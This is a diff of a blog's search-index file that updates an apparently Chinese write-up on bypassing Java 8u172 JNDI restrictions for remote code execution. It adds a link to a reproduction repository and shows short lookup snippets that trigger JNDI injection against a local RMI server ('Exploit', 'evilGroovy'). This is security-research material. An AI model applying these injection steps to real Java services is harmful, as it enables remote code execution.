@@ -1050,7 +1050,8 @@ ThinkPHP &gt;= 5.1.42</p>
   <entry>
     <title>JNDIBypass绕过高版本限制</title>
     <url>/2024/03/18/JNDIBypass/</url>
-    <content><![CDATA[<p>本机的java版本为8u172，所以默认配置导致不能使用常规的加载远程ObjectFactory的方法进行RCE</p>
+    <content><![CDATA[<p>本篇文章所有复现代码均已上传github项目库<a href="https://github.com/LtmThink/JNDIBypass">https://github.com/LtmThink/JNDIBypass</a></p>
+<p>本机的java版本为8u172，所以默认配置导致不能使用常规的加载远程ObjectFactory的方法进行RCE</p>
 <p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202403182349942.png" alt="image-20240309224011989"></p>
 <p>而绕过这一限制有两种思路:</p>
 <ol>
@@ -1108,7 +1109,7 @@ ThinkPHP &gt;= 5.1.42</p>
 </li>
 <li class="lvl-3">
 <p>开启RMI服务端后,触发JNDI注入</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1100/Exploit&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(uri);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1100/Exploit&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(uri);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202403182349945.png" alt="image-20240309225755174"></p>
 </li>
 </ol>
@@ -1131,7 +1132,7 @@ ThinkPHP &gt;= 5.1.42</p>
 <li class="lvl-3">
 <p>触发JNDI注入</p>
 <p>运行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String uri = &quot;rmi://127.0.0.1:1100/Exploit&quot;;</span><br><span class="line">InitialContext initialContext = new InitialContext();</span><br><span class="line">initialContext.lookup(uri);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String uri = &quot;rmi://127.0.0.1:1100/evilGroovy&quot;;</span><br><span class="line">InitialContext initialContext = new InitialContext();</span><br><span class="line">initialContext.lookup(uri);</span><br></pre></td></tr></table></figure>
 <p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202403182349946.png" alt="image-20240310120024039"></p>
 </li>
 </ol>
